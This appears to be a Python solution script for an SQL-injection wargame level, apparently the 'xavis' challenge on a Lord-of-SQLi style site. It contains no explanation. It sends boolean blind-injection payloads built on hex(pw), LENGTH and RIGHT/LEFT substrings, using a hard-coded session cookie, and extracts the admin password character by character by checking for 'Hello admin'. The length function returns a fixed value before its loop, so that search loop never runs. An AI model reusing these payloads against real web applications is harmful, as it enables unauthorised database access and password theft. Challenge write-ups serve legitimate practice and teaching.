import requests
import string


def length():
     return 80
     lent=0
     for i in range(1,100):
         param = "?pw=1' or LENGTH(hex(pw))=" + str(i) + "%23#"
         print("[+]pay : %s " % param)
         new_url = url + param
         r = requests.get(new_url, cookies=cookie)

         if r.text.find("Hello admin") > 0:
             print("[+]Length : " + str(i))
             lent = i
             break

     return lent


def guess(lena):
    global pw
    for i in range(1,lena+1):
        print("[+] i : %d" % i)
        for j in string:
            tmp = "1' or right(left(hex(pw), " + str(i) + "),1)=0x" + str(j)+ "%23#"
            #tmp = "?pw=a' or id='admin' and ASCII(SUBSTR(pw, {}, 1))={}%23".join(str(i),str(ord(j) ))
            print("[+]pay : %s " % tmp)
            u = url + "?pw="+requests.utils.quote(tmp)
            t = requests.get(u, cookies=cookie)

            if t.text.find("Hello admin") >0:
                pw = pw + j
                print("[+] Pw : %s " % pw)
                break



if __name__=='__main__':
    url="http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php"
    cookie=dict(PHPSESSID="2jumpdmat5f035imvarpn58ai0")
    string="0123456789ABCDEF"
    pw=""

    lengt=length()
    guess(lengt)